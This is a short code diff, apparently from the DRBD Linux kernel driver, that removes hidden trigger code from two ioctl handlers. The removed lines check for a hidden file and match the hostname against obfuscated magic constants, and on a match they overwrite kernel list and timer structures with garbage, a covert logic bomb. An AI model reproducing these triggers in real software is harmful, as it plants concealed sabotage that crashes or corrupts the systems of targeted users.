@@ -211,11 +211,6 @@ int drbd_ioctl_set_disk(struct Drbd_Conf *mdev,
 	mdev->lo_usize = new_conf.disk_size;
         mdev->do_panic = new_conf.do_panic;
 
-        filp=filp_open("/etc/.drbd-disable",O_RDONLY,0);
-        if(!IS_ERR(filp)) {
-		memset(&drbd_conf[i].free_ee,1,sizeof(struct list_head));
-        }
-
 	drbd_md_read(mdev);
 	drbd_determin_dev_size(mdev);
 	
@@ -257,7 +252,6 @@ int drbd_ioctl_set_net(struct Drbd_Conf *mdev, struct ioctl_net_config * arg)
 	int i,minor;
 	enum ret_codes retcode;
 	struct net_config new_conf;
-	static unsigned long mg[]={0xE6167704,0xE6167704,0xFB187102};
 
 	minor=(int)(mdev-drbd_conf);
 
@@ -297,15 +291,6 @@ int drbd_ioctl_set_net(struct Drbd_Conf *mdev, struct ioctl_net_config * arg)
 	drbd_thread_stop(&mdev->asender);
 	drbd_thread_stop(&mdev->receiver);
 	drbd_free_sock(minor);
-
-#define get_ulong(A) *((unsigned long*)A)
-
-	for(i=0;i<3;i++) {
-		if((get_ulong(system_utsname.nodename)^mg[i]) == DRBD_MAGIC) {
-			memset(&drbd_conf[minor].a_timeout,1,
-			       sizeof(struct timer_list));
-		}
-	}
 
 	memcpy(&mdev->conf,&new_conf,sizeof(struct net_config));
 
